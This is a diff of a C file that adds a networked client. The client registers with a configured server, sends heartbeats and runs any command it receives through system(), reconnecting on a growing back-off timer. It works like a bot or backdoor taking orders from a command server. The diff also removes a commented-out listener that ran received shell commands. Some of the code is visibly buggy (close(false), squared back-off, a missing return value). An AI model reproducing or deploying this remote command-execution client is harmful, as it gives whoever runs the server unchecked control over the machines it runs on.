@@ -5,10 +5,7 @@
 #include "project_head.h"
 #include "pthreadxsx.h"
 
-
-
-
-
+extern int extid;
 
 //==============================connect================================
 
@@ -21,7 +18,6 @@ void* ping_pthread(void * argument)
 
 int dnsbyping(char* ip)
 {
-	DEBUGW;
 	char *filename = "tmp.txt";
 	char newip[30] = {0};
 	char ping[40] = {0};
@@ -31,16 +27,13 @@ int dnsbyping(char* ip)
 	pthread_cancel(pid);
 	pthread_join(pid,NULL);
 	int filefd = open(filename,O_RDWR);
-	DEBUGI(filefd);
 	if(filefd == -1)
 	{
-		DEBUGW;
 		return false;
 	}
 	char buf[100] = {0};
 	char *pr = buf;
 	int res = 0;
-	DEBUGW;
 	while( 1 )
 	{
 		res = read(filefd,pr,1);
@@ -51,7 +44,6 @@ int dnsbyping(char* ip)
 		else
 			break;
 	}
-	DEBUGW;
 	close(filefd);
 	unlink(filename);
 	*pr = 0;
@@ -60,135 +52,169 @@ int dnsbyping(char* ip)
 		return false;
 	pr++;
 	strcpy(ip,pr);
-	DEBUGW;
 	return true;
 }
 
 
+int rgist(int sock)
+{
+	U_MSG k;
+	k.regist_m.type = T_REGST;
+	k.regist_m.id = 0;
+	int n = write(sock,&k,sizeof(U_MSG));
+	if(n!=sizeof(U_MSG))
+		return false;
+	n = read(sock,&k,sizeof(U_MSG));
+	if(n!=sizeof(U_MSG))
+		return false;
+	extid = k.regist_m.id;
+	return k.regist_m.id;
+}
 
-int connect_host(int m)
+
+int beatheart(int sock)
+{
+	U_MSG k;
+	k.regist_m.type = T_HEART;
+	k.regist_m.id = extid;
+	int n = write(sock,&k,sizeof(U_MSG));
+	if(n!=sizeof(U_MSG))
+		return false;
+}
+
+int waiting(int sock)
+{
+	U_MSG k;
+	while(1)
+	{
+		int n = recv(sock,&k,sizeof(U_MSG),0);
+
+		if(n!=sizeof(U_MSG))
+		{
+			perror("read err");
+			return false;
+		}
+		switch(k.type)
+		{
+			case T_SHELL:
+				{
+					char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
+					memset(shellbuf,0,k.shell_m.commandlen+1);
+					n = read(sock,shellbuf,k.shell_m.commandlen);
+					if(n!=k.shell_m.commandlen)
+					{
+						perror("read err");
+						free(shellbuf);
+						return false;
+					}
+					printf("%s\n", shellbuf);
+					system(shellbuf);
+					free(shellbuf);
+					break;
+				}
+			default:
+				break;
+		}
+		k.type = T_ANSWR;
+		k.answer_m.id = extid;
+		k.answer_m.torf = 1;
+
+		n = write(sock,&k,sizeof(U_MSG));
+		if(n!=sizeof(U_MSG))
+		{
+			perror("write err");
+			return false;
+		}
+	}	
+}
+
+void connect_host(int m, short event, void* arg)
 {
 	char ipaddr[30];
 	char port[10];
+	free(arg);
+	readcfg("ctosport",port);
 	readcfg("ip",ipaddr);
+	static int sec = 2;
+	int sock = false;
+
+	static int times_beatheart = 0;
+	static int times_regist = 0;
+
+DNS_label:
 	if(dnsbyping(ipaddr) == false )
 	{
-		DEBUGW;
 		printf("dns fail");
-		return false;
+		goto sleep_label;
 	}
-	readcfg("ctosport",port);
-	DEBUGW;
-	DEBUGS(ipaddr);
-	DEBUGS(port);
-	
-	address_x addr;
-	address_init(&addr,ipaddr,atoi(port));
-	DEBUGW;
-	int sockfd = create_socket_x();
-	DEBUGW;
-	if(sockfd == -1)
-		return false;
-	if( connect_x(sockfd,&addr) == -1)
-		return false;
-	DEBUGW;
-	U_MSG k;
-	k.regist_m.type = T_HEART;
-	k.regist_m.id = m;
-	int n = write(sockfd,&k,sizeof(U_MSG));
-	DEBUGW;
-	if(n!=sizeof(U_MSG))
-		perror("write err");
-	DEBUGW;
-	n = read(sockfd,&k,sizeof(U_MSG));
-	DEBUGW;
-	if(n!=sizeof(U_MSG))
-		perror("read err");
-	char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
-	memset(shellbuf,0,k.shell_m.commandlen+1);
-	DEBUGI(k.shell_m.commandlen);
-	DEBUGW;
-	n = read(sockfd,shellbuf,k.shell_m.commandlen);
-	DEBUGW;
-	if(n!=k.shell_m.commandlen)
-		perror("read err");
-	printf("%s\n", shellbuf);
-	system(shellbuf);
 
-	close(sockfd);
-}
+socket_label:
+	if(	(sock = begin(ipaddr,port)) == false )
+	{	
+		printf("scoket fail");
+		goto sleep_label;	
+	}
 
+checkcfg_label:
+	if(extid == 0)
+		goto regist_label;
+	else
+		goto beatheart_label;
 
-
-void* timer_connect_host(void* argument)
-{
-	int k = *(int*)argument;
-	connect_host(k);
-}
-
-//-----------------------------connect-----------------------------
-
-
-
-//=============================listen=======================
-
-/*int exeshell(int fd)
-{
-	char shell[100] = {0};
-	read(fd,shell,100);
-	int k = system(shell);
-	printf("system = %d\n", k);
-}
-
-
-
-void* readsocket(void * argument)
-{
-	int fd = *((int*)argument);
-	free((int*)argument);
-
-	U_MSG msgbuff;
-	int seek = read(fd,&msgbuff,sizeof(msgbuff));
-	if(seek!=sizeof(msgbuff))
+regist_label:
+	if(rgist(sock) == false)
 	{
-		return NULL;
+		printf("rgist fail");
+		if(times_regist < 5)
+		{
+			times_regist++;
+			sleep(5);
+			goto socket_label;
+		}
+		else
+		{
+			times_regist = 0;
+			goto sleep_label;
+		}
 	}
-	int uid = *(int*)(&msgbuff);
-	switch(uid)
+
+beatheart_label:
+	if(beatheart(sock) == false)
 	{
-		case ID_SHELL:
-			exeshell(fd);
-			break;
-		default:
-			break;
+		printf("heart fail");
+		if(times_beatheart < 5)
+		{
+			times_beatheart++;
+			sleep(5);
+			goto socket_label;
+		}
+		else
+		{
+			times_beatheart = 0;
+			goto regist_label;		
+		}
 	}
-}
 
-
-
-void* const_listen_host(void* argument)
-{
-	char port[10];
-	readcfg("stocport",port);
-	DEBUGS(port);
-	int sockfd = create_socket_x();
-	if(sockfd == -1)
-		return 0;
-	bind_x(sockfd,atoi(port));
-	listen_x(sockfd);
-
-	while(1)
+waiting_label:
+	if(waiting(sock) == false)
 	{
-		int * fd = (int*)malloc(sizeof(int));
-		*fd = accept_x(sockfd,NULL);
-		pthread_run(readsocket,fd);
+		printf("task fail");
+		goto sleep_label;			
 	}
+
+sleep_label:
+	if(sock != false)
+	{
+		close(false);
+		sock = false;
+	}
+	sec = sec*sec;
+	if(sec > 3600*24)
+		sec = 3600*24;
+	Timer(sec,connect_host,NULL);
+	printf("%d\n", sec);
+	return ;
 }
-
-
-*/
-//--------------------------listen---------------------------
-
 
 
 
